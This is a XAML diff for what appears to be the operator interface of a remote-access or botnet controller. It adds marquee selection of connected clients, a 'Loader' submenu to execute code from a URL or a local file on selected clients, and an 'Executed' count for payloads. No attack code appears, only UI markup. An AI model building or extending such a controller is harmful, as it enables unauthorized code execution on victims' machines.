@@ -223,15 +223,21 @@
                 </Grid>
 
                 <Border Grid.Row="1" Style="{StaticResource CardBorder}" Padding="0">
-                    <DataGrid x:Name="ClientsGrid"
-                              ItemsSource="{Binding Clients}"
-                              SelectedItem="{Binding SelectedClient}"
-                              Style="{StaticResource ModernDataGrid}"
-                              AutoGenerateColumns="False"
-                              IsReadOnly="True"
-                              CanUserAddRows="False"
-                              SelectionMode="Extended"
-                              SelectionChanged="ClientsGrid_SelectionChanged">
+                    <Grid x:Name="ClientsGridContainer" ClipToBounds="True">
+                        <DataGrid x:Name="ClientsGrid"
+                                  ItemsSource="{Binding Clients}"
+                                  SelectedItem="{Binding SelectedClient}"
+                                  Style="{StaticResource ModernDataGrid}"
+                                  AutoGenerateColumns="False"
+                                  IsReadOnly="True"
+                                  CanUserAddRows="False"
+                                  SelectionMode="Extended"
+                                  SelectionUnit="FullRow"
+                                  SelectionChanged="ClientsGrid_SelectionChanged"
+                                  PreviewMouseLeftButtonDown="ClientsGrid_PreviewMouseLeftButtonDown"
+                                  PreviewMouseMove="ClientsGrid_PreviewMouseMove"
+                                  PreviewMouseLeftButtonUp="ClientsGrid_PreviewMouseLeftButtonUp"
+                                  LostMouseCapture="ClientsGrid_LostMouseCapture">
 
                         <!-- ── Right-click context menu ─────────────────────── -->
                         <DataGrid.ContextMenu>
@@ -297,14 +303,16 @@
                                     </MenuItem.Header>
                                 </MenuItem>
                                 <!-- Loader -->
-                                <MenuItem Command="{Binding PlacementTarget.DataContext.LoaderExecCommand, RelativeSource={RelativeSource AncestorType=ContextMenu}}"
-                                          CommandParameter="{Binding PlacementTarget.SelectedItem, RelativeSource={RelativeSource AncestorType=ContextMenu}}">
-                                    <MenuItem.Header>
-                                        <StackPanel Orientation="Horizontal">
-                                            <Image Source="pack://application:,,,/Resources/Assets/loader.png" Width="15" Height="15" Margin="0,0,8,0" VerticalAlignment="Center"/>
-                                            <TextBlock Text="Loader (Execute URL)" VerticalAlignment="Center"/>
-                                        </StackPanel>
-                                    </MenuItem.Header>
+                                <MenuItem Header="Loader">
+                                    <MenuItem.Icon>
+                                        <Image Source="pack://application:,,,/Resources/Assets/loader.png" Width="15" Height="15"/>
+                                    </MenuItem.Icon>
+                                    <MenuItem Header="Execute from URL..."
+                                              Command="{Binding PlacementTarget.DataContext.LoaderExecCommand, RelativeSource={RelativeSource AncestorType=ContextMenu}}"
+                                              CommandParameter="{Binding PlacementTarget.SelectedItem, RelativeSource={RelativeSource AncestorType=ContextMenu}}"/>
+                                    <MenuItem Header="Execute from Local File..."
+                                              Command="{Binding PlacementTarget.DataContext.LoaderExecFileCommand, RelativeSource={RelativeSource AncestorType=ContextMenu}}"
+                                              CommandParameter="{Binding PlacementTarget.SelectedItem, RelativeSource={RelativeSource AncestorType=ContextMenu}}"/>
                                 </MenuItem>
                                 <Separator/>
                                 <!-- Close -->
@@ -391,7 +399,17 @@
                             <DataGridTextColumn Header="Last Seen"  Binding="{Binding LastSeen, StringFormat='{}{0:HH:mm:ss}'}" Width="100"/>
                         </DataGrid.Columns>
                     </DataGrid>
-                </Border>
+
+                    <!-- Windows-like blue marquee selection box -->
+                    <Canvas x:Name="SelectionCanvas" IsHitTestVisible="False">
+                        <Rectangle x:Name="SelectionBox"
+                                   Fill="#330078D7"
+                                   Stroke="#0078D7"
+                                   StrokeThickness="1"
+                                   Visibility="Collapsed"/>
+                    </Canvas>
+                </Grid>
+            </Border>
 
             </Grid>
 
@@ -583,9 +601,10 @@
                         </DataGrid.ContextMenu>
 
                         <DataGrid.Columns>
-                            <DataGridTextColumn Header="Name"   Binding="{Binding Name}"      Width="200"/>
-                            <DataGridTextColumn Header="Type"   Binding="{Binding ModeLabel}"  Width="130"/>
-                            <DataGridTextColumn Header="Source" Binding="{Binding Source}"     Width="*"/>
+                            <DataGridTextColumn Header="Name"     Binding="{Binding Name}"          Width="180"/>
+                            <DataGridTextColumn Header="Type"     Binding="{Binding ModeLabel}"     Width="110"/>
+                            <DataGridTextColumn Header="Executed" Binding="{Binding ExecutedCount}" Width="80"/>
+                            <DataGridTextColumn Header="Source"   Binding="{Binding Source}"        Width="*"/>
                             <DataGridTemplateColumn Header="Status" Width="150">
                                 <DataGridTemplateColumn.CellTemplate>
                                     <DataTemplate>
